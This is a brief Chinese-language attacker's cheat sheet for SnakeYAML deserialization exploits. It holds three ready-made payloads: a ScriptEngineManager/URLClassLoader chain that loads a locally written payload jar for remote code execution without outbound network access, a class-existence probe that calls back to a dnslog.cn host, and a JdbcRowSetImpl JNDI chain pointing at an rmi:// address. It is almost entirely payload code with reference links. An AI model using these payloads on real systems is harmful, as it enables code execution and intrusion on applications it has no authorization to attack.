# snakeyaml

## 不出网利用
>通过写文件然后本地加载rce

//todo 写一个工具 去完成   已经完成了


https://xz.aliyun.com/t/10655

限制了class,不过存在class bean中有object属性  参考： https://mp.weixin.qq.com/s/7HJXfNibY9Z3DPGarTqyZQ

加载本地
```java
String data2 = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"file:E:/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
```

## 判断类存在
```java
 String poc = "[!!判断的类全类名 []: 0, !!java.net.URL [null, \"http://ixvoxg.dnslog.cn\"]: 1]";
```

## 其他链 一般是jndi

```
!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://xxxx", autoCommit: true}
```

参考： https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E
